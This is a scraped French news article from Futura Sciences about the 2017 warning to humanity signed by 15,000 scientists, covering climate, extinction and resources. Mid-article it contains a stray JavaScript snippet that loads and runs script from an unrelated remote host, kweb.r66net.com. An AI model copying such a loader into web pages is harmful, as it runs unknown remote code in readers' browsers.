{"title": "Inedit : 15.000 scientifiques lancent un cri d'alarme sur l'etat de la planete", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-11-14", "content": "Dans un texte signe il y a 25 ans par 1.700 chercheurs, les auteurs exhortaient a reagir face a la destruction de l'environnement, craignant que  << l'humanite ne pousse les ecosystemes au-dela de leurs capacites a entretenir le tissu de la vie >> . Mais la situation s'est encore plus aggravee et devant l'ampleur du phenomene, plus de 15.000 scientifiques ont signe un cri d'alarme sans precedent. Si nous ne reagissons pas, nous allons droit dans le mur, expliquent-ils. Le temps presse. Ce qu'il faut retenir Plus de 15.000 scientifiques, dans tous les domaines, ont signe un appel a reagir face a l'etat de la planete. Jamais un article publie dans une revue scientifique n'aura eu autant de signataires. Ils soulignent non seulement l'urgence mais aussi l'importance de reduire le rechauffement climatique et la destruction des especes vivantes. En 1992, 1.700 scientifiques, dont pres d'une centaine de prix Nobel, lancaient a l'occasion du  Sommet de la Terre  a Rio, premier du genre, le  << World Scientist's Warning to Humanity >> . Cet avertissement a l'humanite decrivait la destruction de l'environnement, peu conscientisee a l'epoque, et soulignait combien notre  espece  est  << sur une trajectoire de collision avec le monde naturel >> , si elle ne reagit pas. Vingt-cinq ans plus tard, les scientifiques constatent que la situation ne s'est pas amelioree. Au contraire, elle a empire dans tous les domaines en crise, avec une exception, l'affaiblissement de la  couche d'ozone , reduit grace a une forte mobilisation internationale. Alors 15.364 scientifiques du monde entier (184 pays) ont signe un nouveau cri d'alarme, d'une ampleur sans precedent. Le texte a ete publie le 13 novembre dans la revue scientifique  BioScience  et dans  Le Monde  ( << Il sera bientot trop tard >>  titrait en Une lundi le quotidien), alors que se deroule jusqu'au 17 novembre, la COP23, sur le  climat , a Bonn.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le peril climatique Le climat, justement.  << Particulierement troublante est la trajectoire actuelle d'un changement climatique potentiellement catastrophique >>  ecrivent les auteurs dans le << cri d'alarme >> de 2017. Le  taux de CO2  dans l' atmosphere  terrestre, nous l'avons vu recemment, n'a jamais ete aussi eleve depuis au moins 800.000 ans. Il est desormais au-dessus de 400  ppm  contre 280 ppm avant l'ere industrielle. Voir aussi : Vers un taux de CO2 jamais vu depuis 200 millions d'annees Et cela ne devrait pas s'ameliorer car les  emissions  de ce  gaz a effet de serre  lequel, rappelons-le, peut sejourner 100 ans dans l'atmosphere, sont reparties a la hausse apres trois annees de stabilite selon le nouveau rapport annuel du  Global Carbon Project . Elles devraient etre de +2 % en 2017 et atteindre un record de 36,8 milliards de tonnes.  << Le monde n'a donc pas atteint son pic d'emissions , affirment les auteurs de l'etude qui vient de paraitre dans  Nature Climate Change, Environmental Research Letters  et  Earth System Science Data .  Cela montre qu'il faut agir plus fortement. Il faut oublier toute autosatisfaction. >> Courbe des emissions de CO 2  dans l'atmosphere terrestre depuis 1990. 2017 s'annonce comme une annee record. (c)  Carbon Global Project                               << La nature, c'est nous >> Pour Corinne Le Quere, de l'universite britannique d'East Anglia, selon des propos rapportes par l'AFP :  << c'est une grande deception. Avec 41 millards de tonnes de CO 2  emis estimes pour 2017 [si l'on ajoute la  deforestation ,  NDLR ], on risque de manquer de temps pour garder la temperature sous 2 degC, et  a fortiori  1,5 degC >> . D'ailleurs, l'objectif tres enthousiaste de limiter le  rechauffement climatique  a +1,5 degC lors des accords de Paris en 2015 semble de plus en plus hors d'atteinte. Cet ete, des chercheurs annoncaient meme qu'il n'y aurait que 5 % de chances de le  limiter a 2 degC . Le changement climatique provoque par une hausse des emissions de gaz a effet de serre n'est qu'un des perils qui assombrit l'avenir de l'humanite et bien sur avec elle, de la vie sur Terre. Affectes desormais par les perturbations creees par le rechauffement global dont nous sommes responsables, les  ecosystemes  sont aussi violemment impactes par leur destruction frontale par l'Homme depuis plusieurs siecles : deforestation, braconnage, exploitation miniere, artificialisation des sols,  agriculture  intensive et usages massifs de  pesticides ... Sans oublier les oceans et la vie marine. Tous les voyants passent au rouge.  << Nous avons declenche un phenomene d' extinction de masse , le sixieme en 540 millions d'annees environ, au terme duquel de nombreuses formes de vie pourraient disparaitre totalement >> , deplorent les 15.000 signataires. Voir aussi : La sixieme extinction de masse des animaux est sous-estimee Un grand nombre de  vertebres  et  invertebres , terrestres et marins, sont en danger d'extinction. Nous avons appris il y a quelques semaines que la  population d'insectes volants  s'est effondree de 75 % en 30 ans en Allemagne. Un chiffre que l'on peut elargir a l'Europe ou les conditions sont similaires sur de nombreux territoires. Leur perte est non seulement dommageable pour la pollinisation mais aussi pour l'ensemble de la  chaine alimentaire , avec les consequences que l'on peut craindre. Interroge par  Le Monde , le biologiste Gilles Boeuf, ancien president du  Museum national d'histoire naturelle , rappelle une evidence :  << La  biodiversite , nous en faisons partie : la nature, c'est nous. Nous ne sommes pas a cote d'elle. Des que l'on admet cela, on comprend que detruire les ecosystemes revient a s'auto-agresser, qu'opposer la protection de la nature d'un cote a la creation d'emplois et au court terme economique de l'autre est d'une totale stupidite >>. L'expansion de Shanghai en Chine en 32 ans. A gauche, photo prise le 23 avril 1984. A droite, le 20 juillet 2016. (c)  Nasa images of change                               Le probleme de la gestion des ressources Pas plus tard qu'il y a huit jours, le celebre physicien  Stephen Hawking  declarait lors d'une conference que si nous ne faisons rien, la Terre serait inhabitable dans un avenir proche, en proie a une surpopulation, des terres devenues incultivables et un epuisement croissant des ressources naturelles. Il exhortait l'humanite a  preparer l'exploration interstellaire . Depuis la signature du premier appel en 1992, la population mondiale a augmente de 35 % (nous sommes a present 7,6 milliards, selon les derniers chiffres des Nations Unies de juin 2017), ce qui n'est pas sans  incidences  sur les ressources comme l' eau douce . En effet,  << le  volume  d'eau douce disponible par habitant a chute de moitie >>  depuis les annees 1960. Tout est une question de gestion des ressources. Dans  Le Mond e, le demographe Herve Le Bras rappelle que  << si l'ensemble de l'humanite mangeait comme les Francais, les ressources de la planete permettraient de nourrir seulement 4 milliards d'humains.  A contrario , avec le regime du Bangladesh, ce serait 12 milliards >> . \" La Terre est notre seul foyer Enfin, la pression demographique s'exerce sur les milieux naturels, les fragmentant de plus en plus jusqu'a les reduire a peau de chagrin. On le voit en  Amazonie  ou en Indonesie, exemples les plus connus ou les grandes forets, foyers des plus riches biodiversites de la planete, sont mises en piece -- idem dans les milieux marins avec la destruction notamment des coraux en raison du rechauffement des eaux et de leur acidification -- pour des  monocultures  (huile de palme,  soja  pour les animaux...), mais c'est aussi le cas dans nos campagnes ou la nature laisse la place au  beton  (environ 236 hectares de perdus par jour en France). << Nous mettons en peril notre avenir en refusant de moderer notre consommation materielle intense mais geographiquement et demographiquement inegale, et de prendre conscience que la croissance demographique rapide et continue est l'un des principaux facteurs des menaces environnementales et meme societales. >> Il sera bientot trop tard ! Pour les chercheurs, nos seules chances de salut passent par un  sursaut  collectif et aussi individuel :  << grace a un  raz-de-maree  d'initiatives organisees a la base, il est possible de vaincre n'importe quelle opposition, aussi acharnee soit-elle, et d'obliger les dirigeants politiques a agir >> , ecrivent-ils. Et cela passe aussi par nos comportements individuels  << en limitant notre propre reproduction [...] et en diminuant drastiquement notre consommation par tete de  combustibles  fossiles, de viande et d'autres ressources >> . << Il sera bientot trop tard pour devier de notre trajectoire vouee a l'echec car le temps presse , conclut l'appel de 2017.  Nous devons prendre conscience, aussi bien dans nos vies quotidiennes que dans nos institutions gouvernementales, que la Terre, avec toute la vie qu'elle recele, est notre seul  foyer . >> Le manchot royal, temoin de l'etat alarmant de l'ecosysteme marin                       Observes au quotidien par des balises Argos, les manchots sont un bon indicateur des stocks de poissons dans une zone donnee. Obliges de parcourir des distances toujours plus grandes, ils pourraient bientot disparaitre. Le Cnes nous explique pourquoi au cours de cette video.                                       ", "theme": "planete"}